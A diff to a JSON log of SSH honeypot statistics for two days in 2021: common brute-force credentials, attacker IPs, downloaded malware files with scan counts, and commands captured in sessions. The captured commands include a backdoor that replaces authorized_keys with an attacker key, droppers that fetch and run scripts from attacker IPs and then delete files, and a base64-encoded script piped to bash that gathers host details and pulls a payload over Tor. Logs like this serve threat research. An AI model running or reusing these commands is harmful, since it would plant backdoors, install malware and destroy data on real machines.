@@ -827,6 +827,129 @@
   ]
 },
 {
+  "date": "2021-05-13",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-01",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 10562
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 668
+    },
+    {
+      "username": "root",
+      "password": "internet",
+      "count": 29
+    }
+  ],
+  "commands": [
+    {
+      "input": "uname -a",
+      "count": 697
+    },
+    {
+      "input": "lscpu | grep Model",
+      "count": 692
+    },
+    {
+      "input": "uname",
+      "count": 692
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 672
+    },
+    {
+      "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.175.194.108/sh; curl -O http://107.175.194.108/sh; chmod 777 sh; sh sh; tftp 107.175.194.108 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 107.175.194.108; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 107.175.194.108 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *",
+      "count": 114
+    },
+    {
+      "input": "echo WFJBTkRPTQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZnVuY3Rpb24ga3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOn0KICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCnJtIC1mICRIT01FL3NzCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzUuMC9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvY3VybCA+ICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApzcyAtdiAgIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvc3MgICA+ICRIT01FL3NzO2NobW9kICt4ICRIT01FL3NzCnNzIC12ICAgfHwgY3VybCAtcyBodHRwOi8vMTM5LjU5LjE1MC43OjQ0My9zcyAtbyAkSE9NRS9zcztjaG1vZCAreCAkSE9NRS9zcwpwcyAgICAgIHx8IGN1cmwgLXMgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvcHMgLW8gJEhPTUUvcHM7Y2htb2QgK3ggJEhPTUUvcHMKCmQ9JChncmVwIHg6JChpZCAtdSk6IC9ldGMvcGFzc3dkfGN1dCAtZDogLWY2KQpjPSQoZWNobyAiY3VybCAtNGZzU0xrQS0gLW0yMDAiKQp0PSQoZWNobyAicnhteHB6Zmt5ZGt1bGhocW51ZnRibWY2ZDVxNjdqamNob3BtaDRvZnN6Znd3bm16NGJxcTJmaWQiKQoKc29ja3ooKSB7Cm49KGRvaC5ubC5haGFkbnMubmV0IGRucy5ob3N0dXgubmV0IHVuY2Vuc29yZWQubHV4MS5kbnMubml4bmV0Lnh5eiBkbnMucnVieWZpc2guY24gZG5zLnR3bmljLnR3IGRvaC5uby5haGFkbnMubmV0IGRvaC1maS5ibGFoZG5zLmNvbSBmaS5kb2guZG5zLnNub3B5dGEub3JnIHJlc29sdmVyLWV1LmxlbHV4LmZpIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMSkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC90bXAgL3Zhci90bXAgO2RvIGVjaG8gZXhpdCA+ICRpL2kgJiYgY2htb2QgK3ggJGkvaSAmJiBjZCAkaSAmJiAuL2kgJiYgcm0gLWYgaSAmJiBicmVhaztkb25lCn0KCnUoKSB7CnNvY2t6CmY9L3NoLiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0IHRvcjJ3ZWIuc3UKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash",
+      "count": 62
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "5.188.86.178",
+      "dst_port": 2222,
+      "count": 692
+    },
+    {
+      "src_ip": "5.188.86.165",
+      "dst_port": 2222,
+      "count": 630
+    },
+    {
+      "src_ip": "5.188.87.58",
+      "dst_port": 2222,
+      "count": 622
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "5.188.87.58",
+      "robot": true,
+      "count": 487
+    },
+    {
+      "src_ip": "5.188.86.178",
+      "robot": true,
+      "count": 457
+    },
+    {
+      "src_ip": "5.188.86.165",
+      "robot": true,
+      "count": 450
+    }
+  ],
+  "file_download": [
+    {
+      "url": "http://107.175.194.108/sh",
+      "outfile": "var/lib/cowrie/downloads/1c1dd77b4ae029454da8645fbdc70bd5d027cb05897c9f34f5109b569879f9a7",
+      "scans": {
+        "positives": null,
+        "total": null
+      },
+      "count": 1
+    },
+    {
+      "url": "http://209.141.58.203/ssh",
+      "outfile": "var/lib/cowrie/downloads/ef8f83cf318308bbd3b28ff0d5538aea45547686eb5ff663e040032d7b9b2ca5",
+      "scans": {
+        "positives": 18,
+        "total": 56
+      },
+      "count": 1
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "45.227.255.163",
+      "dst_ip": "chek.zennolab.com",
+      "dst_port": 80,
+      "count": 958
+    },
+    {
+      "src_ip": "5.188.86.219",
+      "dst_ip": "5.226.176.16",
+      "dst_port": 443,
+      "count": 538
+    },
+    {
+      "src_ip": "45.227.255.163",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 502
+    }
+  ]
+},
+{
   "date": "2021-03-16",
   "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01",
   "passwords": [
@@ -1058,6 +1181,120 @@
       "dst_ip": "api.ipify.org",
       "dst_port": 443,
       "count": 906
+    }
+  ]
+},
+{
+  "date": "2021-06-09",
+  "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-01",
+  "passwords": [
+    {
+      "username": "root",
+      "password": "1234",
+      "count": 9904
+    },
+    {
+      "username": "nproc",
+      "password": "nproc",
+      "count": 470
+    },
+    {
+      "username": "root",
+      "password": "admin",
+      "count": 117
+    }
+  ],
+  "commands": [
+    {
+      "input": "echo -e \"\\x6F\\x6B\"",
+      "count": 4709
+    },
+    {
+      "input": "uname -a",
+      "count": 485
+    },
+    {
+      "input": "uname -m",
+      "count": 478
+    }
+  ],
+  "pre_disconnect_command": [
+    {
+      "input": "echo -e \"\\x6F\\x6B\"",
+      "count": 4709
+    },
+    {
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "count": 477
+    },
+    {
+      "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 209.141.58.203/ssh || curl -o ssh 209.141.58.203/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane 1",
+      "count": 4
+    }
+  ],
+  "connect": [
+    {
+      "src_ip": "116.62.136.121",
+      "dst_port": 2222,
+      "count": 4710
+    },
+    {
+      "src_ip": "5.188.86.169",
+      "dst_port": 2222,
+      "count": 727
+    },
+    {
+      "src_ip": "5.188.86.165",
+      "dst_port": 2222,
+      "count": 646
+    }
+  ],
+  "session_closed": [
+    {
+      "src_ip": "116.62.136.121",
+      "robot": true,
+      "count": 4706
+    },
+    {
+      "src_ip": "5.188.86.212",
+      "robot": true,
+      "count": 510
+    },
+    {
+      "src_ip": "5.188.86.221",
+      "robot": true,
+      "count": 509
+    }
+  ],
+  "file_download": [
+    {
+      "url": "http://209.141.58.203/ssh",
+      "outfile": "var/lib/cowrie/downloads/1ec237da28aad150f6b0ecdd4cfe0858bb1bb9514c8f50bb9436acf26212c316",
+      "scans": {
+        "positives": 26,
+        "total": 59
+      },
+      "count": 1
+    }
+  ],
+  "proxy_request": [
+    {
+      "src_ip": "45.227.255.163",
+      "dst_ip": "www.google.ru",
+      "dst_port": 443,
+      "count": 4912
+    },
+    {
+      "src_ip": "78.128.113.150",
+      "dst_ip": "video-weaver.ord03.hls.ttvnw.net",
+      "dst_port": 443,
+      "count": 959
+    },
+    {
+      "src_ip": "45.227.255.163",
+      "dst_ip": "chekfast.zennolab.com",
+      "dst_port": 80,
+      "count": 712
     }
   ]
 },
